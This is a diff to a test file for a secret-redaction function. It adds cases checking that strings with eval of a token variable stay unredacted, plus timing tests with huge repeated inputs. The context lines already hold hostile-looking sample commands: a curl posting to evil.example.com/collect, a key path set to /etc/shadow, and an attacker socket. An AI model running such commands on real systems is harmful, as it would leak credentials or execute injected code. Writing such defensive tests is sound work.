@@ -50,6 +50,8 @@ describe("redactForReview", () => {
     "SSH_AUTH_SOCK=/tmp/attacker.sock git push",
     "PRIVATE_KEY_PATH=/etc/shadow node x.js",
     "API_TOKEN=evil.example.com/collect curl -d @- $API_TOKEN",
+    "RUN_TOKEN=abcdefghijklmnopqrst; $RUN_TOKEN --all",
+    "RUN_TOKEN=abcdefghijklmnopqrst; eval ${RUN_TOKEN}",
   ])("keeps paths and hosts visible: %s", (text) => {
     expect(redact(text)).toBe(text);
   });
@@ -80,6 +82,11 @@ describe("redactForReview", () => {
     redact(`Authorization${" ".repeat(200_000)},`);
     redact(`a${"_key".repeat(200_000)}`);
     redact(`TOKEN=${"a".repeat(1_000_000)}`);
+    redact("a=".repeat(200_000));
+    // Just under the size the contextual patterns still run on.
+    redact("a=".repeat(130_000));
+    redact("--token=".repeat(30_000));
+    redact("Authorization:".repeat(20_000));
     expect(performance.now() - started).toBeLessThan(2_000);
   });
 
